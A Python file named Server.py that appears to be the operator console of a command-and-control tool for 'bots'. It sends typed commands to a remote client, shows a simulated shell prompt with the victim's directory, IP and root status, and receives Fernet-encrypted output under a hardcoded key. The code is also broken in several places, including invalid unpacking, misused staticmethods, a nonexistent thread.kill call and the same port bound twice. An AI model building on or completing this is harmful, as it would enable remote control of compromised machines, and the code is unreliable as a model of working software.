import argparse
import socket
import threading 
import time
from cryptography.fernet import Fernet

icon = """\
█▀█ █▀█ ▀▀▀█ 
░▄▀ ░▄▀ ░░█░ 
█▄▄ █▄▄ ░▐▌░
"""

argument_parser = argparse.ArgumentParser(prog='Server.py')
argument_parser.add_argument('-c', '--commander')
args = argument_parser.parse_args()


class ClientManager:
    def __init__(self, client_socket, client_ip, server):
        self.client_socket = client_socket
        self.client_ip = client_ip
        self.server = server

    def request_handler(self, client_socket: socket.socket, message: str):
        fernet = Fernet(b'cw_0x689RpI-jtRR7oE8h_eQsKImvJapLeSbXpwF4e4=')
        str_header = ''
        encrypted_body = ''
        str_message = fernet.decrypt(message.encode('utf-8'))
        encrypted_body = str_message.split(b'IDENTIFIER')[0][10:]

    def manage_connection(self, client_socket: socket.socket, address: str):
        pwd, machine_ip, user = client_socket.recv(8192).decode()
        self.server.pwd, self.server.machine_ip, self.server.user = pwd, machine_ip, user
        self.server.send_command(client_socket)

        message = client_socket.recv(16384).decode()
        self.request_handler(client_socket, message)


class Server:
    def __init__(self, client_ip: str):
        self.client_ip = client_ip
        self.pwd = ''
        self.machine_ip = ''
        self.user = ''

        # Initializing the socket to send commands
        self.sending_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sending_socket.connect((self.client_ip, 5000))

        # Initializing the socket to receive outputs
        self.reception_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.reception_socket.bind(('localhost', 5001))

        # Starting the error managing thread
        self.error_thread = threading.Thread(target=self.listen_errors)
        self.error_thread.start()

        self.listen_for_client()

    def listen_for_client(self):
        self.reception_socket.listen()
        client_socket, address = self.reception_socket.accept()
        client_manager = ClientManager(client_socket, address, self)

    # Queue
        while len(threading.enumerate()) > 10:
            client_socket.send(f'There are {len(threading.enumerate()) - 1} clients ahead of you. Refresh in 30 sec'.encode('utf-8'))
            time.sleep(30)

        while True:
            client_socket.settimeout(60)

            client_thread = threading.Thread(target=client_manager.manage_connection, args=[client_socket, address])
            client_thread.start()


    def display(self):
        # Function to simulate the terminal
        prefix: str = ''

        if self.user != 'root':
            prefix = '$'
            prompt = f"[{self.pwd}][{self.machine_ip}]{prefix}"
            return prompt
        prefix = '#'
        prompt = f"[{self.pwd}][{self.machine_ip}]{prefix}"
        return prompt

    @staticmethod
    def display_output(self, output: str):
        print(output)

    @staticmethod
    def listen_errors(self):
        # Function to deal with bots errors
        receiving_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        receiving_socket.bind((socket.gethostname(), 5001))
        receiving_socket.listen()

        print(receiving_socket.recv(8192).decode())

        for thread in threading.enumerate():
            thread.kill()

    def get_command(self):
        # Function to receive the wanted command
        command = input(self.display())
        return command

    def send_command(self, send_socket: socket.socket):
        # Function to send commands to client
        command = self.get_command()
        send_socket.send(command.encode('utf-8'))


def main():
    server = Server('127.0.0.1')


main()
